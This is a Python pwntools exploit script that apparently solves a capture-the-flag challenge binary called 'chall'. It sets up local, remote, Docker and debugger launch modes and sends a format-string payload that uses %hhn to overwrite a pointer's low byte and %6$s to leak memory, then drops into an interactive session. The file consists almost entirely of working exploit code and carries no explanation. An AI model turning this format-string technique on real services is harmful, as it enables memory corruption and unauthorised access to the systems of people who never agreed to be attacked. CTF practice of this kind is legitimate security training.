#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chall')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+207
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    lsb = 0xa0
    payload = f"%c%c%c%c%c%{lsb-5}c%hhn%6$s".encode()

    io.sendline(payload)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()
